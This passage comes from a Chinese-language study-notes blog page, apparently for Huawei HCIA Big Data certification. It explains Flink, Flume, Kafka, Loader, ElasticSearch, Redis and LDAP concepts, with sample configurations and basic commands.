优点:数据一定不会被重复执行</li><li>最少一次:数据可能会发送多次，可靠性高，吞吐量较小<br>  优点:数据不会丢失<br>  缺点:数据可能会被重复执行</li><li>仅有一次(精准一次) :数据就发送一-次, 并且保证发送成功，可靠性高，吞吐量最低<br>  优点:数据不会丢失，且数据不被重复处理<br>  缺点:消耗的资源和时间较多</li></ul><h2 id="Ack机制-消息传输最少一次"><a href="#Ack机制-消息传输最少一次" class="headerlink" title="Ack机制(消息传输最少一次)"></a>Ack机制(消息传输最少一次)</h2><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_23.png" alt="Ack机制"></p><h1 id="Flink"><a href="#Flink" class="headerlink" title="Flink"></a>Flink</h1><pre><code>分布式实时计算引擎(流处理引擎)</code></pre><h2 id="Flink-VS-Spark-Streaming"><a href="#Flink-VS-Spark-Streaming" class="headerlink" title="Flink VS Spark Streaming"></a>Flink VS Spark Streaming</h2><ul><li>Flink可以做流处理(侧重)也可以做批处理，底层引擎属于流处理引擎</li><li>通过流处理引擎模拟批处理形式实现的批处理</li><li>Spark可以做流处理也可以做批处理(侧重点)，底层弓|擎属于批处理引擎</li><li>通过批处理引擎,模拟流处理实现的流处理功能</li></ul><h2 id="Flink的关键特性"><a href="#Flink的关键特性" class="headerlink" title="Flink的关键特性"></a>Flink的关键特性</h2><pre><code>状态、时间、窗口、检查点</code></pre><h2 id="Flink系统架构"><a href="#Flink系统架构" class="headerlink" title="Flink系统架构"></a>Flink系统架构</h2><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_24.png" alt="Flink系统架构"></p><ul><li>部署形式: Local (单机版部署)<br>  Cluster (Standalone: Flink集群自己管理资源调度<br>  Yarn:借助Yarn组件帮助管理协调资源和任务)<br>  Clound (云部署)</li><li>Flink核心模块: Runtime (不管是流处理还是批处理都是在Runtime中执行)</li><li>接口层: DataStream (流处理)和DataSet (批处理)</li><li>Table API &amp; SQL:处理结构化数据<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Table</span> API:将操作应用封装成方法</span><br><span class="line">    <span class="keyword">select</span>(&quot;t_ demo &quot;).<span class="keyword">where</span>(&quot;条件&quot;)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">SQL</span>:基于<span class="keyword">Table</span> API使用，</span><br><span class="line">    sqlQuery(&quot;select * from t_ demo where条件&quot;)</span><br></pre></td></tr></table></figure></li></ul><h2 id="有界流和无界流"><a href="#有界流和无界流" class="headerlink" title="有界流和无界流"></a>有界流和无界流</h2><ul><li>有界流:知道开始，知道结束，使用批处理处理有界流数据.</li><li>无界流:知道开始，不知道结束，使用流处理接口进行数据处理</li></ul><h2 id="DataStream-用于存储数据的数据集，只能执行流处理操作"><a href="#DataStream-用于存储数据的数据集，只能执行流处理操作" class="headerlink" title="DataStream:用于存储数据的数据集，只能执行流处理操作"></a>DataStream:用于存储数据的数据集，只能执行流处理操作</h2><ul><li>基于流处理运行环境获取到的数据</li></ul><h2 id="DataSet-用来接收数据的数据集，只能执行批处理操作"><a href="#DataSet-用来接收数据的数据集，只能执行批处理操作" class="headerlink" title="DataSet:用来接收数据的数据集，只能执行批处理操作"></a>DataSet:用来接收数据的数据集，只能执行批处理操作</h2><ul><li>基于批处理运行环境获取到的数据</li></ul><p><code>并不能在一个应用中同时接收流处理和批处理接口，以此实现流处理和批处理的共用</code></p><h2 id="Flink运行流程"><a href="#Flink运行流程" class="headerlink" title="Flink运行流程"></a>Flink运行流程</h2><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_25.png" alt="Flink运行流程"></p><ol><li>DataSource:接收数据输入，从数据源获取数据</li><li>Transformations:数据转换，数据处理过程</li><li>DataSink:将最终数据结果输出到指定位置(如HDFS、 HBase、 文件、数据库等)</li></ol><h2 id="Flink程序运行流程"><a href="#Flink程序运行流程" class="headerlink" title="Flink程序运行流程"></a>Flink程序运行流程</h2><p><code>1. 创建运行环境流处理/批处理</code><br>2. 通过运行环境对象获取数据源数据(DataStream&#x2F;DataSet)<br>3. 针对数据集进行数据转换<br>4. 将最终结果进行输出(批处理的print算子)<br><code>5. 最后执行程序(行动算子) executor()</code></p><h2 id="Flink运行程序"><a href="#Flink运行程序" class="headerlink" title="Flink运行程序"></a>Flink运行程序</h2><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_26.png" alt="Flink运行程序"></p><ol><li>Client向JobManager发起请求</li><li>Client对任务进行优化等操作</li><li>JobManager分配任务给TaskManager</li><li>TaskManager接收到任务后执行任务</li><li>TaskManager反馈任务执行状态给JobManager</li><li>JobManager统一反馈给用户</li></ol><ul><li>Flink Client:用户通过Client连接到JobManager</li><li>JobManager (主节点) :接收用户请求，管理资源任务分配，管理从节点信息</li><li>TaskManager (从节点) :接收任务处理任务，反馈给主节点</li><li>Standalone部署:创建Task Slot: Flink的抽象资源</li></ul><h2 id="Flink状态"><a href="#Flink状态" class="headerlink" title="Flink状态"></a>Flink状态</h2><pre><code>区别于其他组件的一-个特性，支持状态管理(中间结果状态)</code></pre><h2 id="Fink窗口类型"><a href="#Fink窗口类型" class="headerlink" title="Fink窗口类型"></a>Fink窗口类型</h2><ul><li>滑动窗口: 窗口移动方式是平移,设定参数时需要设定窗口大小,滑动距离.窗口大小固定,可能会出现数据源重复和数据丢失的情况</li><li>滚动窗口: 窗口移动方式滚动,滚动距离就是窗口大小,设定窗口时只需要设定窗口大小.窗口大小固定,不会出现数据重复或者数据丢失的情况,会出现空窗口的情况</li><li>会话窗口: 由会话启动的窗口,设定过期时间,窗口代销不固定,运行时不会有丢失的数据,不会出现空窗口</li><li>时间窗口: 以时间为条件设定的窗口,<code>分别可以再分为滑动或滚动</code></li><li>数量窗口: 由会话启动的窗口,设定过期时间,<code>分别可以再分为滑动或滚动</code></li></ul><h2 id="Fink的时间类型"><a href="#Fink的时间类型" class="headerlink" title="Fink的时间类型"></a>Fink的时间类型</h2><ul><li>时间类型: 事件发生的时间 </li><li>时间类型: 时间达到处理系统的时间</li><li>处理时间(默认): 时间被处理的时间</li><li>时间乱序问题: 事件被处理的顺序不是时间产生顺序</li><li>时间乱序原因: 数据受到数据传输影响</li></ul><h2 id="Watermark-水位线-x2F-水印-解决数据乱序问题"><a href="#Watermark-水位线-x2F-水印-解决数据乱序问题" class="headerlink" title="Watermark(水位线&#x2F;水印): 解决数据乱序问题"></a>Watermark(水位线&#x2F;水印): 解决数据乱序问题</h2><ul><li>设定水位线时间,当水位线设定的时间时间也达到系统时,就会触发窗口执行</li><li>可设置水位线延迟,可允许窗口延迟触发\</li></ul><h2 id="对于延迟数据的处理方式"><a href="#对于延迟数据的处理方式" class="headerlink" title="对于延迟数据的处理方式"></a>对于延迟数据的处理方式</h2><ul><li>丢弃(默认): 当窗口已经被触发过,该窗口的数据达到也会被丢弃,不会被执行</li><li>可允许延迟: 设定可允许延迟时间,窗口已经被执行,但是输在可允许延迟时间达到,重新重发窗口的执行<br><code>allowedLateness</code>(可延迟时间)</li><li>收集后做统一处理: 把所有的延迟数据收集起来,在程序最后做统一处理<br><code>OutputTag&lt;T&gt; lateOutputTag = new OutputTag //用于存放延迟数据的数据集</code><br><code>.side0utputLateData(late0utputTag)</code></li></ul><h2 id="Flink容错性-CheckPoint实现"><a href="#Flink容错性-CheckPoint实现" class="headerlink" title="Flink容错性 (CheckPoint实现)"></a>Flink容错性 (CheckPoint实现)</h2><ol><li><code>CheckPoint:检查点，自动触发,当任务结束后会自动删除</code><ul><li>保存当前任务状态，周期性触发,默认情况下不启动检查点</li><li>在启动检查点时就可以设定周期时间，单位ms: .enableCheckPointing(10000)</li><li>修改消息传输语义(默认情况仅有一次): .setCheckPointMode(CheckPointMode.AT_LEAST_ONCE)</li><li>快照超时时间:防止一个问题快照影响大量快照创建堆积: .setCheckpointingTimeout(60000)</li><li>可以设定检查点之间的最小间隔时间</li><li>可以设定最大并行执行数量</li><li>设定外部检查点:可以把检查点信息存储于在外部系统中，不会因为Flink系统问题受到影响</li></ul></li><li>SavePoint:保存点，底层CheckPoint, 手动触发,任务结束后也依旧保留</li></ol><h2 id="状态保存"><a href="#状态保存" class="headerlink" title="状态保存"></a>状态保存</h2><p>内存:默认，state和checkpoint都存储在内存，只是用本地测试<br>文件系统: state在内存， checkpoint在文件系统中<br>数据库: state存储在内置数据库中，checkpoint在文件系统中，针对大量数据任务处理的场景</p><h1 id="Flume"><a href="#Flume" class="headerlink" title="Flume"></a>Flume</h1><pre><code>Flume属于一个高性能、分布式的海量日志采集工具可以适用于流数据采集、也可以用于静态数据采集</code></pre><h2 id="Flume基础架构"><a href="#Flume基础架构" class="headerlink" title="Flume基础架构"></a>Flume基础架构</h2><pre><code>(主用应用于单节点数据采集)</code></pre><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_27.png" alt="Flume基础架构"></p><ul><li>Flume中有两个组件对外交互: source、 sink</li><li>source:采集数据,接收数据输入</li><li>channel:管道、 临时存储</li><li>sink:数据输出</li></ul><h2 id="Flume多agent架构"><a href="#Flume多agent架构" class="headerlink" title="Flume多agent架构"></a>Flume多agent架构</h2><pre><code>(主要用于集群外采集传递到集群内采集)</code></pre><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_28.png" alt="Flume多agent架构"></p><ul><li>把第一级的Flume数据输出到第二级Flume中</li><li>设定第一-级Flume的sink类型为avro协议或者thrift协议可以将数据存储到下一级Flume的Source</li></ul><h2 id="Flume多Agent合并"><a href="#Flume多Agent合并" class="headerlink" title="Flume多Agent合并"></a>Flume多Agent合并</h2><pre><code>(将多数据源采集到的数据汇总处理)</code></pre><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_29.png" alt="Flume多Agent合并"></p><h2 id="Flume数据传输基本单位"><a href="#Flume数据传输基本单位" class="headerlink" title="Flume数据传输基本单位"></a>Flume数据传输基本单位</h2><ul><li>event: 基本单位,header+ byte[]</li><li>当source采集数据时，在source内部将数据封装成event</li></ul><h2 id="Flume-Agent原理"><a href="#Flume-Agent原理" class="headerlink" title="Flume Agent原理"></a>Flume Agent原理</h2><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_30.png" alt="Flume Agent原理"></p><ol><li>在source内部可以将数据封装成event</li><li>source将event传输给channel处理器(拦截器)可以做数据简单处理</li><li>清洗完后的数据通过channe|选择器将event输入到指定的channel</li><li>SinkRunner在程序运行时就启动</li><li>使用sink处理器实例化一个指定类型的sink从指定的channel中抽取数据</li><li>将抽取到的数据按照设定的类型和目的路径将数据输出</li></ol><h2 id="Flume-Source"><a href="#Flume-Source" class="headerlink" title="Flume Source"></a>Flume Source</h2><pre><code>(数据收集、接收数据输入)</code></pre><ul><li>驱动型:被动接收数据输入</li><li>轮询型:周期性的主动扫描是否有新数据产生</li></ul><h2 id="Flume-Channel"><a href="#Flume-Channel" class="headerlink" title="Flume Channel"></a>Flume Channel</h2><pre><code>(数据存储)</code></pre><ul><li><p>MemoryChannel (内存) : event数据存放在当前节点的内存中<br>  读写速度快，数据未持久化，占用内存空间<br>  capacity:最大内存容量(默认情况下使用到节点内存存满为止)</p></li><li><p>FileChannel (文件) :使用WAL,管理上比较复杂<br>数据可持久化，数据读写速度慢于内存形式</p></li><li><p>JDBCChannel (内置数据库) : derby数据库，可以替代File存储的形式<br>数据可持久化，数据读写速度慢于内存形式</p></li></ul><h2 id="Flume-Sink"><a href="#Flume-Sink" class="headerlink" title="Flume Sink"></a>Flume Sink</h2><pre><code>(数据输出)</code></pre><h2 id="Flume的Source、Channel、-Sink之间的关系"><a href="#Flume的Source、Channel、-Sink之间的关系" class="headerlink" title="Flume的Source、Channel、 Sink之间的关系"></a>Flume的Source、Channel、 Sink之间的关系</h2><ul><li><code>一个Source至少连接一个Channel</code></li><li><code>一个Sink只作用于一个Channel</code></li></ul><h2 id="Flume级联节点"><a href="#Flume级联节点" class="headerlink" title="Flume级联节点"></a>Flume级联节点</h2><pre><code>级联节点间传输的数据可以进行加密、压缩</code></pre><ul><li>加密:提高数据传输安全性</li><li>压缩:提高整体传输速度(减少传输时间)</li><li><code>Flume内部数据传输(source --&gt; channel --&gt; sink) 不需要加密</code></li></ul><h2 id="Flume运行实例"><a href="#Flume运行实例" class="headerlink" title="Flume运行实例"></a>Flume运行实例</h2><pre><code>内容需要配置到配置文件中(自定义.properties)</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a.sources= r1</span><br><span class="line">a.channels=c1</span><br><span class="line">a.sinks=k1</span><br><span class="line">a.sourses.r1.type=taildir</span><br><span class="line">a.sourses.r1.postion= 记录pos记录的文件</span><br><span class="line">a.sourses.r1.filegroups=f1 f2</span><br><span class="line">a.sourses.r1.filegroups.f1 = 要监控的文件</span><br><span class="line">a.sourses.r1.filegroups.f2= 要监控的文件</span><br><span class="line">a.channels.c1.type=memory</span><br><span class="line">a.sinks.k1.type=logger</span><br><span class="line">a.sources.r1.channels=c1</span><br><span class="line">a.sinks.k1.channel=c1</span><br></pre></td></tr></table></figure><h2 id="Flume运行命令"><a href="#Flume运行命令" class="headerlink" title="Flume运行命令"></a>Flume运行命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flume-ng agent --name a --conf flumecï 71411Z --conf-file 配置文件 - Dflume.root.logger=info, console</span><br><span class="line">flume-ng agent -n a -C flume配置文件路径 -f 配置文件 -Dflume.root.logger=info, console</span><br></pre></td></tr></table></figure><h1 id="Kafka"><a href="#Kafka" class="headerlink" title="Kafka"></a>Kafka</h1><pre><code>分布式日志系统(发布订阅消息系统)，可分区、多副本、多订阅</code></pre><h2 id="消息传输形式"><a href="#消息传输形式" class="headerlink" title="消息传输形式"></a>消息传输形式</h2><ul><li>点对点:数据在被获取到之后就会被从消息系统中删除(只有-一个用户可以获取到这个消息)</li><li>发布订阅:消息发布之后，就算被用户获取之后也不会删除，依旧保留在系统中提供给其他用户获取</li></ul><h2 id="Kafka的特点"><a href="#Kafka的特点" class="headerlink" title="Kafka的特点"></a>Kafka的特点</h2><ul><li>可支持TB级别的数据也能在常量时间内的访问性能</li><li>高吞吐率:单节点每秒可以传输100K条数据</li><li>可分区:数据以分区形式存储</li><li>多副本:提高数据容错性</li><li>同时支持流处理和批处理</li><li>可扩展性:本身属于集群由多节点组成，扩展节点</li></ul><h2 id="Kafka拓扑结构"><a href="#Kafka拓扑结构" class="headerlink" title="Kafka拓扑结构"></a>Kafka拓扑结构</h2><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_31.png" alt="Kafka拓扑结构"></p><ul><li>Kafka:由broker集群组成</li><li>Producer:数据发布者，发布消息，将数据发布到Kafka中存储</li><li>Consumer:数据消费者，订阅消息，从Kafka中获取数据</li><li>ZooKeeper: Kafka强依赖，监测集群状态</li></ul><h2 id="Kafka集群系统架构"><a href="#Kafka集群系统架构" class="headerlink" title="Kafka集群系统架构"></a>Kafka集群系统架构</h2><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_32.png" alt="Kafka集群系统架构"></p><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_33.png" alt="Kafka集群系统架构"></p><h2 id="消费组-consumer-group"><a href="#消费组-consumer-group" class="headerlink" title="消费组:consumer group"></a>消费组:consumer group</h2><pre><code>每个消费者一定是属于某一个消费组</code></pre><ul><li>消费数据规则:消费组内的数据是竞争的,消费组间的数据是共享的 <br>一条消息可以被多个消费组获取,但是每个消费组只能有一个消费者消费信息</li><li>Kafka Topic:消息类别名<br>用于区分记录数据、发布者发布数据时需要指定topic,消费者订阅数据时指定topic</li><li>Kafka Partition:分区，数据写入:顺序追加的方式<br>数据以分区的形式存储，在创建topic时可以指定当前topic中有几个分区</li><li>Kafka Segment:分段<br>每个消息就是一个分段, 分段由两个文件组成.index和.log</li><li>Offset:偏移量值<br>每一个消息都有的唯一标识位置</li><li>每个消费组都会维护一份offset文件(当前组中的成员读取的数据位置)</li><li>读取数据时数据定位: broker –&gt; topic –&gt; offset</li></ul><h2 id="Kafka的其他重要概念"><a href="#Kafka的其他重要概念" class="headerlink" title="Kafka的其他重要概念"></a>Kafka的其他重要概念</h2><ul><li>replica:副本，在创建partition的时候指定该分区有几个副本\</li></ul><p>–partitons 1 –replaction-factor 2<br>数据文件为2份，partiton本身也属于副本的一部分</p><ul><li>leader:从副本中选取一个leader对外提供服务，发布者和消息者只跟leader交互</li><li>follower:除leader以外的其他副本都是follower, follower同步leader信息</li><li>controller: kafka中的一 -个服务器: leader选举、 leader切换</li><li>ISR列表:列表中的follower,能正常同步leader信息<br>只有在列表中的follower有资格成为下一-任leader<br>刚开始所有的follower都在ISR列表中，当follower故障不能及 时同步leader时会被移除列表</li></ul><h2 id="Kafka分区副本"><a href="#Kafka分区副本" class="headerlink" title="Kafka分区副本"></a>Kafka分区副本</h2><pre><code>(节点和节点之间的分区互为主备)</code></pre><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_34.png" alt="Kafka分区副本"></p><p>分区副本同步</p><pre><code>(follower从leader同步数据 )</code></pre><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_35.png" alt="分区副本同步"></p><ul><li>如果所有分区都出现故障<br>可靠性高、恢复速度慢:等待ISR中的分区恢复，第一个恢复就是leader<br>可靠性低、恢复速度快:等待分区恢复，第一个恢复的不管是不是ISR列表中的分区也成为leader</li><li>可靠性传输:幂等性(操作一次和多次的结果是一样)<br>给每条消息一个唯-标识id, 消息传递后使用一个列表记录已传输成功的消息id<br>每条消息传输到达时都会被使用id在列表中查询，查看id是否存在<br>如果存在:说明消息之前已经被传输过<br>如果不存在:正常处理，并且处理完后将id写入列表</li><li>acks机制(检测数据是否发送成功)<br>acks&#x3D;0:不管数据是否发送成功<br>acks&#x3D;1:当数据写入leader时就认为成功<br>acks&#x3D;all:当数据写入leader并且follower都接收到才反馈成功</li><li>Kafka持久化存储数据(不管数据有没有被消费过)</li><li>旧数据的处理方式:删除&#x2F;压缩<br>删除:配置数据过期时间<br>压缩:根据键值对的key值只保留最新的value值，以前的值就删除</li><li>Kafka高吞吐的原因<br>顺序读写:数据以追加形式写入分区，速度远快于随机读写<br>零拷贝:数据写入不需要经过数据缓冲区直接到达磁盘<br>分区:数据可以分别存在多个分区中，读取的时候可以并行的从分区中读取到数据<br>压缩:可以对数据进行压缩</li></ul><p><code>分区副本:只有leader对外提供服务的, follower只做同步操作</code></p><h1 id="Loader"><a href="#Loader" class="headerlink" title="Loader"></a>Loader</h1><pre><code>基于开源的Sqoop组件开发得到的</code></pre><h2 id="Loader-1"><a href="#Loader-1" class="headerlink" title="Loader"></a>Loader</h2><ul><li>Loader数据导入导出(作用在关系型数据库和非关系型数据库之间)<br>关系型数据库:结构化<br>非关系型数据库:非结构化</li><li>数据导入:数据从RDB导入到NoSQL</li><li>数据导出:数据从NoSQL导出到RDB</li><li>Loader相比较Sqoop组件的增强特性<br>图形化:提供WebUI界面可以通过界面配置任务,连接器的配置<code>MRS (Hue)</code><br>高性能:底层使用MapReduce并行处理<br>高可靠:主备双机的搭建<br>  作业失败后允许重试<br>  作业失败后不会有残留的数据<br>安全性:使用kerberos进行安全认证</li></ul><h2 id="Loader模型架构"><a href="#Loader模型架构" class="headerlink" title="Loader模型架构"></a>Loader模型架构</h2><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_36.png" alt="分区副本同步"></p><ol><li><p>Loader Client: Tool: 命令行模式连接Loader服务</p><ul><li>Web UI: MRS图形化的方式连接到Loader</li></ul></li><li><p>Loader Server:</p><ul><li>Restful API (http+json) 对外提供的连接接口</li><li>JobSheduler: Transform 转换模块–&gt;数据处理.<br> Execution执行模块–&gt;执行计划<br> Submission提交模块–&gt;提交到MR<br> JobManager:管理任务执行状态</li><li>Metadata Repository:元数据仓库，存储管理元数据</li><li>HA Manager:主备管理</li></ul></li></ol><h2 id="Loader任务执行"><a href="#Loader任务执行" class="headerlink" title="Loader任务执行"></a>Loader任务执行</h2><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_37.png" alt="Loader任务执行"></p><ol><li>Client提交任务</li><li>Loader任务计划</li><li>将任务提交给Yarn</li><li>Yarn调配资源将任务分配为Map或Reduce任务执行</li><li>将数据存入设定的存储介质中</li></ol><h2 id="Loader任务配置"><a href="#Loader任务配置" class="headerlink" title="Loader任务配置"></a>Loader任务配置</h2><ul><li>输入:数据来源的配置</li><li>转换:字段映射、获取数据、过滤数据、并发执行数量</li><li>输出:数据最终输出目的地的配置</li></ul><h1 id="ElasticSearch"><a href="#ElasticSearch" class="headerlink" title="ElasticSearch"></a>ElasticSearch</h1><pre><code>分布式检索服务,适用实时场景Hive:可以做查询分析，底层MR处理，不适用实时</code></pre><h2 id="ElasticSearch特点"><a href="#ElasticSearch特点" class="headerlink" title="ElasticSearch特点"></a>ElasticSearch特点</h2><ul><li>基于Lucena扩展</li><li>可以水平扩展</li><li>原型环境和生产环境可以无缝切换</li><li><code>作为非关系型数据库NoSQL数据库使用</code></li><li>支持结构化数据和非结构化数据</li></ul><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><ol><li><p>正排索引:在文件中查找关键字 <br> 扫描每个文件内容找到跟关键字相关的文件，返回文件 </p></li><li><p>倒排索引:根据关键字查找文件(提前给文件设定关键字)<br>根据关键字查哪些文件标记了这个关键字<br>快速查找相关文件，并且文件相关度更高</p></li></ol><h2 id="ElasticSearch系统架构"><a href="#ElasticSearch系统架构" class="headerlink" title="ElasticSearch系统架构"></a>ElasticSearch系统架构</h2><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_38.png" alt="ElasticSearch系统架构"></p><ul><li>Client:连接到ZooKeeper获取集群信息，连接到集群</li><li>EsMaster:主要任务分配，管理EsNode信息， 不参与分片级别的数据检索</li><li>EsNode:处理用户管理索引|操作，管理自身分片信息(数据默认存储在内存中)</li><li>ZooKeeper: es强依赖，管理集群状态，并且记录集群信息</li></ul><h2 id="ElasticSearch中的核心概念"><a href="#ElasticSearch中的核心概念" class="headerlink" title="ElasticSearch中的核心概念"></a>ElasticSearch中的核心概念</h2><ul><li>索引: index –&gt; 命名空间</li><li>文档: document –&gt; 数据存储，ES中的检索基本单元</li><li>映射: mapping –&gt; 约束字段类型</li></ul><h2 id="ElasticSearch命令使用"><a href="#ElasticSearch命令使用" class="headerlink" title="ElasticSearch命令使用"></a>ElasticSearch命令使用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">数据添加/修改: put /索引/_doc/id</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;key&quot;</span>:<span class="string">&quot;value&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">数据查询: get /索引/_doc/id</span><br><span class="line">数据删除: delete /索引/_doc/id</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h1><pre><code>基于内存的，网络高性能数据库</code></pre><ul><li>读取速度快，低延迟</li><li>适用于实时场景</li><li>可持久化(RDB&#x2F;AOF)</li><li>key-value<br>key命名:见名知意<br>value:可以存储多样数据</li><li>属于NoSQL数据库(存储多样化:图像、视频、音频、数字、文字等)</li></ul><h2 id="Redis应用场景"><a href="#Redis应用场景" class="headerlink" title="Redis应用场景"></a>Redis应用场景</h2><ul><li>排序类应用</li><li>设置过期时间应用</li><li>统计计数</li><li>消息队列</li><li>临时存储</li></ul><h2 id="Redis系统架构"><a href="#Redis系统架构" class="headerlink" title="Redis系统架构"></a>Redis系统架构</h2><ul><li><code>无中心、自组织的集群</code>: 集群中的所有节点会维护一个集群拓扑</li><li>分桶:根据key值计算hash存储进不同的槽中</li><li>集群拓扑中维护的就是槽和节点的映射关系</li><li><code>Redis节点只帮助用户重定向，不进行转发</code><br>重定向: Client发出多次请求(<code>Client分 别请求节点</code>)<br>转发: Client只需要请求第一个节点，节点帮助Client向正确的节点发出请求(Client只需要请求第一 台节点)</li></ul><h2 id="Redis读写流程"><a href="#Redis读写流程" class="headerlink" title="Redis读写流程"></a>Redis读写流程</h2><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_39.png" alt="Redis读写流程"></p><ol><li>Client向任意一 个节点发出请求，连接到redis</li><li>从redis节点中获取redis集群拓扑，得到key存储的server信息</li><li>可以获取到key对应的槽所在的server信息</li><li>如果做读取，对server发起读请求，如果是写入，就发起写请求</li><li><code>如果在Client获取拓扑时，数据发生变动，从一个节点迁移到另-一个节点</code></li><li>此时Client获取到的是旧的拓扑，向原定的server发起请求</li><li>server接收到请求后发现Client要请求的数据已经被迁移,会告诉Client数据被迁移到哪个节点</li><li>Client从原server中接收到正确server的反馈信息</li><li>对新server重新发起一-次请求，获取数据响应</li></ol><h2 id="Redis关键特性"><a href="#Redis关键特性" class="headerlink" title="Redis关键特性"></a>Redis关键特性</h2><ul><li>支持多数据库<br>名称不支持自定义，从0开始递增<br>默认情况下支持1 6个数据库,不做更改的情况下使用的是0号数据库<br>如果要切换当前使用的数据库: <code>select 0</code></li><li>可以通过正则表达式匹配所有符合规则的key值<br>keys正则表达式<br>要查找所有的a开头后面跟数字的所有的key值: <code>keys a[0-9]*</code></li><li>判断key是否存在: <code>exists key</code></li><li>删除key值: <code>del key key2</code></li><li>获取key对应的类型: <code>type key</code></li><li><code>redis中不区分大小写( 单个单词要不就全大写要不就全小写)</code></li></ul><h2 id="Redis数据类型及使用"><a href="#Redis数据类型及使用" class="headerlink" title="Redis数据类型及使用"></a>Redis数据类型及使用</h2><ul><li>String的数字可以作为数值类型使用</li><li>Hash添加数据时value是键值对(应用于对象数据存储)</li><li>List可重复的有序集合<br>操作数据时可以区分左右(前后)查询整个集合中的数据时<code>lrange key 0 -1</code></li><li>Set不重复无序的集合<br>可以针对集合计算交集、并集等</li><li>Sorted Set:有序集合,可以根据给key的分数进行排序</li></ul><h2 id="Redis性能优化"><a href="#Redis性能优化" class="headerlink" title="Redis性能优化"></a>Redis性能优化</h2><ul><li>可设置key的生存时间</li><li>Redis管道(pipeline) –&gt; 管道数据传输速度快于普通传输(仅在Java API中)</li><li>数据排序Sort,如果是对集合进行排序Sorted Set</li><li>Redis持久化(RDB&#x2F;AOF)<br>RDB(默认) :使用快照的方式对当前数据进行持久化存储<br>创建快照的条件(在指定时间内有指定数量的key发生变化): <code>save 时间s数量</code><br>手动触发: sava、bgsave<br>save:使用主进程运行，在创建快照过程中会堵塞其他进程运行<br>bgsave:划分一个子进程用于执行快照，不会影响其他得到进程运行<br>AOF:使用的日志文件形式存储信息<br>可以设定数据发生变更时进行记录\</li><li>Redis内存占用情况<br>相同数据的情况下，32位操作系统比64位所使用的内存更少<br>100万条简单键值对，占用100M空间，实际占用空间较少，可存储数据量较大</li></ul><h2 id="Redis的优化"><a href="#Redis的优化" class="headerlink" title="Redis的优化"></a>Redis的优化</h2><ol><li>精简键名值数据:尽可能简单，但是能知意–&gt;<code>可以节省存储空间</code></li><li>在不需要持久化的应用场景中关闭持久化功能</li><li>内部编码优化</li><li>SlowLog:记录运行超时命令系统</li><li>修改Linux内核内存分配策略: 1:不需要检验内存情况，可以直接运行任务直到内存使用完为止</li><li>关闭THP:节省资源开销(redis修改时先复制再对复制内容修改)<br>(THP:如果数据只有200K,使用THP的情况下，这个大页大小约20M<br>不使用THP时，复制后总大小400K,使用了THP复制后总大小40M)</li><li>修改linux中的tcp最大连接数</li><li>限制Redis使用内存大小</li><li>做多条数据操作时，尽量选择批量操作命令不要通过循环执行</li></ol><h1 id="安全认证-amp-权限管理Kerberos-amp-Ldap"><a href="#安全认证-amp-权限管理Kerberos-amp-Ldap" class="headerlink" title="安全认证&amp;权限管理Kerberos &amp; Ldap"></a>安全认证&amp;权限管理Kerberos &amp; Ldap</h1><pre><code>在大数据平台中，统一身份体现在:只要通过用户名和密码成功登陆，就可以操作授`权过的组件`统一用户管理系统:用户及相关权限管理、用户登录后的相关管理等</code></pre><h2 id="统一身份认证管理系统"><a href="#统一身份认证管理系统" class="headerlink" title="统一身份认证管理系统"></a>统一身份认证管理系统</h2><ul><li>管理模块:管理信息存储,管理认证，用户请求</li><li>信息存储模块:存储用户信息、权限信息</li><li>认证模块:通过用户请求和当前系统存储的用户信息做比对，确认用户是否正确、核查用户权限</li></ul><h2 id="Ldap目录服务系统"><a href="#Ldap目录服务系统" class="headerlink" title="Ldap目录服务系统"></a>Ldap目录服务系统</h2><ul><li>目录:加快数据检索速度</li><li>轻量级目录访问协议、跟踪协议</li></ul><h2 id="LdapServer系统结构-树状结构"><a href="#LdapServer系统结构-树状结构" class="headerlink" title="LdapServer系统结构(树状结构)"></a>LdapServer系统结构(树状结构)</h2><ul><li>树状结构中会包含很多节点，每个节点都有自己的名称dn(当前节点及它的所有父节点)</li><li>根节点名称是dc,标记为区域</li><li>区域的下一级是组织，组织节点名称: ou</li><li>组织节点下一级是对象，对象节点名称: cn,存储对象属性</li></ul><h2 